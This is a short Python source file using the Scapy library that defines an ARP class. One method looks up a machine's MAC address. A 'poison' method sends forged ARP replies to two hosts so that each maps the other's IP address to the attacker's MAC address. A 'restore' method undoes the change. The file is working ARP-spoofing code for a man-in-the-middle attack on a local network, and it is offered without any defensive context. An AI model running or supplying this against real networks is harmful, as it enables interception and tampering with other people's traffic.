from scapy.all import *


class arp():

    def get_original(self, ip):
        answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=5, retry=3)
        for s, r in answered:
            return r[Ether].src

    def poison(self, machine_a_ip, machine_a_mac, machine_b_ip, machine_b_mac):
        # Poison machine A's ARP cache (tell machine B is at attacker's MAC)
        send(ARP(op=2, pdst=machine_a_ip, psrc=machine_b_ip, hwdst=machine_a_mac))
        # Poison machine B's ARP cache (tell machine A is at attacker's MAC)
        send(ARP(op=2, pdst=machine_b_ip, psrc=machine_a_ip, hwdst=machine_b_mac))

    def restore(self, machine_a_ip, machine_a_mac, machine_b_ip, machine_b_mac):
        # Broadcast 3 times machine B's correct MAC address
        send(ARP(op=2, pdst=machine_a_ip, psrc=machine_b_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=machine_b_mac), count=3)
        # Broadcast 3 times machine A's correct MAC address
        send(ARP(op=2, pdst=machine_b_ip, psrc=machine_a_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=machine_a_mac), count=3)
